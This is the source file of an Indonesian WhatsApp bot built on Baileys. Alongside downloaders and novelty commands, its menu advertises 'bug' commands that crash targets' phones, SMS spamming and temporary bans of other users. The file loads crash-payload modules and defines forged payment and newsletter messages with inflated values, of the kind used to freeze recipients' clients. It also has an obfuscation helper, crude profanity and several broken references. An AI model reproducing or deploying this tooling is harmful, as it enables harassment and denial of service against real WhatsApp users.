/*
================================================================================

> Kalo Mau Recode Kasih Credit gw ›
        TheZetsubXygen / Ryo

📝 -> Created By thezetsuboxygen / Ryo
🖥️ -> Base Ori By thezetsuboxygen / Ryo

❗PERINGATAN KERAS:

Script ini disediakan secara gratis dan tanpa biaya. Dilarang keras untuk menjual atau mendistribusikan ulang untuk keuntungan komersial, atau menggunakan script ini untuk tujuan komersial tanpa izin tertulis. Kami ingin tegaskan bahwa script ini diberikan secara gratis untuk berbagi pengetahuan dan membantu komunitas. Setiap upaya menjual atau mengkomersilkan script ini tanpa izin merupakan pelanggaran etika yang tidak diterima. Gunakanlah script ini dengan penuh tanggung jawab dan hormati usaha yang telah dilakukan oleh pembuatnya.

❗Dengan menggunakan script ini, Anda menyatakan bahwa Anda memahami dan setuju bahwa penggunaan script ini sepenuhnya berada pada risiko Anda sendiri!!.

pembuat script ini tidak memberikan jaminan apa pun, baik secara tersurat maupun tersirat, mengenai keandalan, keamanan, kesesuaian untuk tujuan tertentu, atau kinerja dari script ini. pengguna bertanggung jawab penuh atas semua tindakan yang dilakukan dengan menggunakan script ini, termasuk tapi tidak terbatas pada modifikasi, implementasi, dan konsekuensi yang timbul dari penggunaannya. pembuat script ini tidak bertanggung jawab atas kerusakan, kerugian, atau konsekuensi lain yang mungkin terjadi sebagai hasil dari penggunaan atau ketidakmampuan menggunakan script ini. diharapkan bagi pengguna untuk menggunakan script ini dengan bijak dan bertanggung jawab, dengan mempertimbangkan segala risiko yang ada. segala bentuk kerusakan atau kerugian yang timbul adalah tanggung jawab pengguna, dan pembuat script tidak akan dikenai tuntutan atau klaim atas dasar apa pun

dengan melanjutkan penggunaan script ini, Anda mengakui bahwa Anda telah membaca dan mengerti pernyataan ini dan setuju untuk terikat oleh syarat dan ketentuan yang tercantum di atas.

Terima kasih atas pengertian dan kerjasama Anda.
================================================================================
*/
require('./config.js')
const {
smsg, getGroupAdmins, formatp, tanggal, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize
} = require('./lib/myfunction.js')
const { downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage } = require('@whiskeysockets/baileys')
const axios = require('axios')
const os = require('os')
const fs = require('fs')
const util = require('util')
const fetch = require('node-fetch')
const speed = require('performance-now')
const moment = require('moment-timezone')
const { spawn: spawn, exec } = require('child_process')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { performance } = require('perf_hooks')
const ytdl = require("ytdl-core")
const yts = require("yt-search")
const colors = require('@colors/colors/safe')
const jsobfus = require('javascript-obfuscator')
const chalk = require('chalk')
const { uptotelegra } = require('./lib/upload')
const { toPTT, toAudio } = require("./lib/converter")
const { UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const fakeUA = require('fake-useragent')
const randomUA = fakeUA().toString()
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys')
const pino = require('pino')

//Base
module.exports = joestar = async (joestar, m, chatUpdate, store) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)

//Bokep
const botNumber = await joestar.decodeJid(joestar.user.id)
const itsMe = m.sender == botNumber ? true : false

// Group
const isGroup = m.chat.endsWith('@g.us')
const groupMetadata = m.isGroup ? await joestar.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false

//Pirtek
const { bersihin } = require('./latx/bersihin.js')
const { mdelay } = require('./latx/mdelay.js')
const { cartbutton } = require('./latx/cartbutton.js')
const { virtex2 } = require('./latx/virtex2.js')
const { ios1 } = require('./latx/ios1.js')
const { ios2 } = require('./latx/ios2.js')
const { buganjay } = require('./latx/buganjay.js')
const sedoso = fs.readFileSync(`./latx/10k.png`)
const dlapan = fs.readFileSync(`./latx/8,5k.png`)

//Media 
const mengkece = fs.readFileSync(`./image/mengkece.jpg`)
const thejoestar = fs.readFileSync(`./image/joestar.jpg`)
const fakedoc = fs.readFileSync(`./src/bruhhh.apk`)
const fakejpg = fs.readFileSync(`./src/bruhhh.jpg`)
const smile = fs.readFileSync(`./music/lil salmonela.mp3`)
const bajigur = fs.readFileSync(`./music/acumalaka.mp3`)

//Akses Owner
const kontributor = JSON.parse(fs.readFileSync('./dtbs/owner.json'))
const isCreator = [botNumber, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)

// Akses Prem
let premium = JSON.parse(fs.readFileSync('./dtbs/premium.json'))
const isPremium = [botNumber, ...kontributor, ...premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)

//React
const moji = ['📚', '💭', '💫', '🌌', '🌏', '〽️', '🌷', '🍁', '🪻',]
const randomemoji = moji[Math.floor(Math.random() * moji.length)]

//Ini Waktu | Waktu adalah emas, maka dari itu sentuh lah rumput dan jangan nolep dikamar terus, usahakan kontol lu jangan dikocok terus. Lutut ama sikut lu udh masuk kedalam.
const moment = require('moment-timezone');
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
let d = new Date
let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime()
let weton = ["Pahing", "Pon","Wage","Kliwon","Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString("id", { weekday: "long" })
let calender = d.toLocaleDateString("id", {
day: "numeric",
month: "long",
year: "numeric"
})

//Status
if (!joestar.public) {
if (!m.key.fromMe) return
}

// Quoted 

const qgeneral = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `🔥`,
jpegThumbnail: fakejpg,
caption: ` Pois0n - Bug ? \n ${m.body || m.mtype} `,
inviteExpiration: Date.now() + 1814400000
}
}
}

const qbug = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: ` pois0n - Bot `
}
}
}

const qpay = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
id: '0@s.whatsapp.net',
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: ` ${m.body || m.mtype} `
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}


const flower = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": global.jpegT
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"⟠ 🅈🄺🄾🅃🄱🄾🅃 ⿻ 🄺🄴🄼🄰🅃🄸🄰🄽 😈 々\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${unic.n6}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
}
]
}
}
}
};

//Reply

const msgreply = async (teks) => {
await sleep(500);
return joestar.sendMessage(m.chat, {
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: true,
renderLargerThumbnail: false,
title: ` ❗ 🅈🄺🄾🅃🄱🄾🅃 😈 🄺🄴🄼🄰🅃🄸🄰🄽❗`,
body: null,
previewType: "VIDEO",
thumbnail: mengkece,
sourceUrl: `https://chat.whatsapp.com/IHMjjMdmi2tKoy3zOSK8fr`,
mediaUrl: `https://chat.whatsapp.com/IHMjjMdmi2tKoy3zOSK8fr`
}
},
text: teks
}, {
quoted: qgeneral
});
}


//Donglod

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
ytdl(Link, { filter: 'audioonly' }).pipe(fs.createWriteStream(mp3File)).on('finish', async () => {
await joestar.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: qgeneral })
fs.unlinkSync(`./${mp3File}`)
})
} catch (err) {
msgreply(`${err}`)
}
}

const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
let nana = ytdl(Link).pipe(fs.createWriteStream(mp4File)).on('finish', async () => {
await joestar.sendMessage(m.chat, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: qgeneral })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
msgreply(`${err}`)
}
}

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
});
const result = {
status: 200,
author: `xyz`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

if (m.message) {
if (isCmd && !m.isGroup) {
console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 Ada Pesan, Om! 🚀`)));
console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`)));
} else if (m.isGroup) {
console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 Ada Pesan, Om! 🚀`)));
console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}
🔍 MESS LOCATION: ${groupName}`)));
}
}



switch (command) {

case 'menu': {
let itsmenu = `
${ucapanWaktu} 𝐎𝐧𝐢𝐢 𝐂𝐡𝐚𝐧

𖣂 Sc Private 𖤲 <特> 𖤲
🌈   名前 : ${pushname}
⛩️   タグ : @${m.sender.split("@")[0]}

❗🅈🄺🄾🅃🄱🄾🅃 😈 🄺🄴🄼🄰🅃🄸🄰🄽❗

✦ 𝐁𝚹𝐓 𝐁𝐲: 🅈🄺🄾🅃🄱🄾🅃 .
 𝐏𝐫𝐞𝐟𝐢𝐱 ❕: 「 𝑀𝑈𝐿𝑇𝐼 」
 
 𝐒𝐭𝐚𝐭𝐮𝐬 🌟: ✱ 𝒑𝒖𝒃𝒍𝒊𝒄 & 𝒇𝒓𝒊𝒗𝒂𝒕𝒆 ༣

𝑂𝑤𝑛𝑒𝑟

⿻ ${prefix}self
⿻ ${prefix}public
⿻ ${prefix}addprem 62XXXX
⿻ ${prefix}delprem 62XXXX
⿻ ${prefix}addowner 62XXXX
⿻ ${prefix}delowner 62XXXX
⿻ ${prefix}shutdown
⿻ ${prefix}listprem
⿻ ${prefix}listowner

𝐵𝑢𝑔

⿻ ${prefix}bugtroli <jumlah>
⿻ ${prefix}bugiphone <jumlah>
⿻ ${prefix}bugaudio <jumlah>
⿻ ${prefix}bugflow <jumlah>
⿻ ${prefix}bugrelog <jumlah>
⿻ ${prefix}bugreact <reply pesan>
⿻ ${prefix}bgc (gunakan di group)
⿻ ${prefix}bgcv2 (gunakan di group)
⿻ ${prefix}bugpc (gunakan di private chat)
⿻ ${prefix}bugpcv2 (gunakan di private chat)
⿻ ${prefix}bugloc 62896###
⿻ ${prefix}bug-s 62896###
⿻ ${prefix}bug@ 62896###
⿻ ${prefix}vios 62896###|amount
⿻ ${prefix}bugextend 62896###|amount
⿻ ${prefix}element-grp linkgroup
⿻ ${prefix}penghitaman idgrup@g.us
⿻ ${prefix}spamsms 62,8789###|amount
⿻ ${prefix}temp-ban 62|87827####

❗/𝐺𝑒𝑛𝑒𝑟𝑎𝑙 >

𝐶𝑜𝑛𝑣𝑒𝑟𝑡

⿻ ${prefix}add <users>
⿻ ${prefix}kick <tag users>
⿻ ${prefix}sticker
⿻ ${prefix}smeme
⿻ ${prefix}toimage
⿻ ${prefix}tomp4
⿻ ${prefix}toaud
⿻ ${prefix}tiktokvd
⿻ ${prefix}qc <text>
⿻ ${prefix}ping
⿻ ${prefix}gc open|close

𝑂𝑝𝑒𝑛𝑎𝑖

⿻ ${prefix}ai
⿻ ${prefix}gpt4
⿻ ${prefix}prompt-gpt
⿻ ${prefix}gptgo
⿻ ${prefix}dall-e

𝐷𝑜𝑤𝑛𝑙𝑜𝑎𝑑 

⿻ ${prefix}gitclone
⿻ ${prefix}mediafire
⿻ ${prefix}tiktokmp3
⿻ ${prefix}tiktokvideo
⿻ ${prefix}ytmp4
⿻ ${prefix}ytmp3
⿻ ${prefix}play
⿻ ${prefix}playmusic
⿻ ${prefix}douyindl
⿻ ${prefix}igdlimage
⿻ ${prefix}igdlmp4
⿻ ${prefix}pintmp4

𝑉𝑜𝑖𝑐𝑒 𝐶𝒉𝑎𝑛𝑔𝑒𝑟

⿻ ${prefix}bass
⿻ ${prefix}blown
⿻ ${prefix}deep
⿻ ${prefix}earrape
⿻ ${prefix}fast
⿻ ${prefix}fat
⿻ ${prefix}nightcore
⿻ ${prefix}reverse
⿻ ${prefix}robot
⿻ ${prefix}slow
⿻ ${prefix}tupai 

𝐺𝑎𝑐𝒉𝑎 𝑁𝑔𝑎𝑤𝑢𝑟

⿻ ${prefix}apakah
⿻ ${prefix}bisakah
⿻ ${prefix}bagaimanakah
⿻ ${prefix}gantengcek
⿻ ${prefix}cekganteng
⿻ ${prefix}cantikcek
⿻ ${prefix}cekcantik
⿻ ${prefix}sangecek
⿻ ${prefix}ceksange
⿻ ${prefix}gaycek
⿻ ${prefix}cekgay
⿻ ${prefix}lesbicek
⿻ ${prefix}ceklesbi
⿻ ${prefix}kapankah
⿻ ${prefix}wangy
⿻ ${prefix}cekmati

𝑊𝑎𝑛𝑔𝑦 / 𝑊𝑎𝑖𝑓𝑢

⿻ ${prefix}neko
⿻ ${prefix}waifu
⿻ ${prefix}shinobu
⿻ ${prefix}megumin
⿻ ${prefix}kill
⿻ ${prefix}pat
⿻ ${prefix}lick
⿻ ${prefix}bite
⿻ ${prefix}yeet
⿻ ${prefix}bonk
⿻ ${prefix}wink
⿻ ${prefix}poke
⿻ ${prefix}nom
⿻ ${prefix}slap
⿻ ${prefix}smile
⿻ ${prefix}wave
⿻ ${prefix}blush
⿻ ${prefix}smug
⿻ ${prefix}glomp
⿻ ${prefix}happy
⿻ ${prefix}dance
⿻ ${prefix}cringe
⿻ ${prefix}highfive
⿻ ${prefix}handhold

> \`🄺🄴🄼🄰🅃🄸🄰🄽 😈\`

`
let hiks = {
image: thejoestar, 
caption: itsmenu,
//gifPlayback: false,
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
title: '⟠ Leͥgeͣnͫdᴮᴼˢˢ亗 ⿻ 🄺🄴🄼🄰🅃🄸🄰🄽 😈 々',
body: `👤 名前 : ${m.pushName}\n🕑 ${ucapanWaktu}`,
showAdAttribution: false,
thumbnail: mengkece,
mediaType: 4,
MediaUrl: `${global.yt}`,
sourceUrl: `${global.yt}`,
}
}
};
joestar.sendMessage(m.chat, hiks, { quoted: flower });
await sleep(5000)
joestar.sendMessage(m.chat, { audio: smile, mimetype: 'audio/mpeg', ptt:true }, { quoted: flower })
};
break

// Status
case 'public': {
if (!isCreator) return msgreply('*khusus Premium*') 
joestar.public = true
msgreply('succes')
}
break

case 'self': {
if (!isCreator) return msgreply('*khusus Premium*') 
joestar.public = false
msgreply('succes')
}
break

case 'assalamualaikum': {
msgreply(` Wa'alaikumsalam `)
}
break
//mulai dariiii siiiniiiiii perrubahan ny .‼️‼️
case 'addprem':
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Use ${prefix+command} number\nContoh ${prefix+command} 62xxx`)
prem1 = q.split("|")[0].replace(/[^0-9]/g, '')
let cek1 = await joestar.onWhatsApp(prem1 + `@s.whatsapp.net`)
if (cek1.length == 0) return (`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
premium.push(prem1)
fs.writeFileSync('./dtbs/premium.json', JSON.stringify(premium))
msgreply(`${prem1} Sudah menjadi premium!!!`)
joestar.sendMessage(prem1+'@s.whatsapp.net', {image: {url: `https://telegra.ph/file/a46ab7fa39338b1f54d5a.mp4`}, caption: `Kamu sekarang adalah user premium!!`},{quoted: qpay})
//let ceknya = await koy.onWhatsApp(prrkek)
//if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
//premium.push(prrkek)
//fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
//m.reply(`The Number ${prrkek} Has Been Premium!`)
break
case 'delprem':
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Use ${prefix+command} Nomor\nContoh ${prefix+command} 62xxx`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = premium.indexOf(prem2)
premium.splice(unp, 1)
fs.writeFileSync('./dtbs/premium.json', JSON.stringify(premium))
msgreply(`${prem2} Tidak lagi premium!!!`)
//unp = premium.indexOf(ya)
//premium.splice(unp, 1)
//fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
//m.reply(`The Number ${ya} Has Been Removed Premium!`)
break
case 'addowner':
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Use ${prefix+command} number\nContoh ${prefix+command} 62xxx`)
prem1 = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await joestar.onWhatsApp(prem1 + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(prem1)
fs.writeFileSync('./dtbs/owner.json', JSON.stringify(owner))
m.reply(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Use ${prefix+command} nomor\nContoh ${prefix+command} 62xxx`)
prem2 = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(prem2)
owner.splice(unp, 1)
fs.writeFileSync('./dtds/owner.json', JSON.stringify(owner))
m.reply(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listpremium': case 'listprem':
teks = '*Premium List*\n\n'
for (let joestar of premium) {
teks += `- ${ya}\n`
}
teks += `\n*Total : ${premium.length}*`
joestar.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": premium } })
break
case 'listowner': case 'listown':
teks = '*owner List*\n\n'
for (let kontol of owner) {
teks += `- ${kontol}\n`
}
teks += `\n*Total : ${owner.length}*`
joestar.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": owner } })
break
case "tes": case "bot":{
m.reply('_*Bot Sudah Aktif Kak*_')
}
break
case 'qc': {
const { quote } = require('./lib/quote.js')
let text
if (args.length >= 1) {
text = args.slice(0).join(" ")
} else if (m?.quoted && m?.quoted.text) {
text = m?.quoted.text
} else m?.reply("Input teks atau m?.reply teks yang ingin di jadikan quote!")
if (!text) return m?.reply('masukan text')
if (text.length > 30) return m?.reply('Maksimal 30 Teks!')
await loading()
let ppnyauser = await await joestar.profilePictureUrl(m?.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
const rest = await quote(text, pushname, ppnyauser)
joestar.sendImageAsSticker(m?.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
case "ping":
case "botstatus":
case "statusbot": {
const used = process.memoryUsage();
const cpus = os.cpus().map((cpu) => {
cpu.total = Object.keys(cpu.times).reduce(
(last, type) => last + cpu.times[type],
0,
);
return cpu;
});
const cpu = cpus.reduce(
(last, cpu, _, { length }) => {
last.total += cpu.total;
last.speed += cpu.speed / length;
last.times.user += cpu.times.user;
last.times.nice += cpu.times.nice;
last.times.sys += cpu.times.sys;
last.times.idle += cpu.times.idle;
last.times.irq += cpu.times.irq;
return last;
},
{
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0,
},
},
);

var date = new Date();
var jam = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();
var ram = `18gb`;
var cpuuuu = os.cpus();
var sisaram = `${Math.round(os.freemem)}`;
var totalram = `${Math.round(os.totalmem)}`;
var persenram = (sisaram / totalram) * 100;
var persenramm = 100 - persenram;
var ramused = totalram - sisaram;

var space = await checkDiskSpace(process.cwd());
var freespace = `${Math.round(space.free)}`;
var totalspace = `${Math.round(space.size)}`;
var diskused = totalspace - freespace;
var neww = performance.now();
var oldd = performance.now();
let timestamp = speed();
let latensi = speed() - timestamp;
var { download, upload } = await checkBandwidth();
let respon = ` *ᴘ ɪ ɴ ɢ* 
 ${Math.round(neww - oldd)} ms 
 ${latensi.toFixed(4)} ms 

 *ʀ ᴜ ɴ ᴛ ɪ ᴍ ᴇ*
 ${runtime(process.uptime())} 

 *s ᴇ ʀ ᴠ ᴇ ʀ* 
 *🛑 ʀᴀᴍ:* ${formatSize(ramused)} (${persenramm?.toString().split('.')[0]}%) / ${formatSize(totalram)} 
 *🔵 ғʀᴇᴇRAM:* ${formatSize(sisaram)} 
 *🔴 ᴍᴇᴍᴏʀy:* ${ram}
 *🗂 ᴅɪꜱᴋ:* ${formatSize(diskused)} / ${formatSize(totalspace)}
 *📂 ғʀᴇᴇDISK:* ${formatSize(freespace)}
 *🔭 ᴘʟᴀᴛғᴏʀᴍ:* ${os.platform()}
 *🧿 sᴇʀᴠᴇʀ:* ${os.hostname()}
 *📤 ᴜᴘʟᴏᴀᴅ:* ${upload}
 *📥 ᴅᴏᴡɴʟᴏᴀᴅ:* ${download}
 *⏰ ᴛɪᴍᴇ sᴇʀᴠᴇʀ:* ${jam} : ${menit} : ${detik}
 
 *📮 ɴᴏᴅᴇᴊꜱ ᴠᴇʀꜱɪᴏɴ:* ${process.version}
 *💻 ᴄᴘᴜ ᴍᴏᴅᴇʟ:* ${cpuuuu[0].model}
 *📊 ᴏꜱ ᴠᴇʀꜱɪᴏɴ:* ${os.version()}
 
_NodeJS Memory Usaage_
${Object.keys(used)
.map(
(key, _, arr) =>
`${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
used[key],
)}`,
)
.join("\n")}
${readmore}
${cpus[0]
? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times)
.map(
(type) =>
`- *${(type + "*").padEnd(6)}: ${(
(100 * cpu.times[type]) /
cpu.total
).toFixed(2)}%`,
)
.join("\n")}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus
.map(
(cpu, i) =>
`${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(
cpu.times,
)
.map(
(type) =>
`- *${(type + "*").padEnd(6)}: ${(
(100 * cpu.times[type]) /
cpu.total
).toFixed(2)}%`,
)
.join("\n")}`,
)
.join("\n\n")}`
: ""
}
`.trim();
joestar.relayMessage(m?.chat,{
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: respon,
contextInfo: {
mentionedJid: [m?.sender],
externalAdreply: {
showAdAttribution: true
}}}}}}, {})
}
break
case "tiktokvd": case "tiktokvdjoget":{
m.reply('_*⿻tiktokgirl\n⿻tiktokghea⿻\ntiktokbocil\n⿻tiktokukhti\n⿻tiktoksantuy\n⿻tiktokkayes\n⿻tiktokpanrika\n⿻tiktoknotnot*_')
}
break
case 'tiktokgirl':
m.reply(mess.wait)
var asupan = JSON.parse(fs.readFileSync('./random/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
joestar.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
m.reply(mess.wait)
var gheayubi = JSON.parse(fs.readFileSync('./random/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
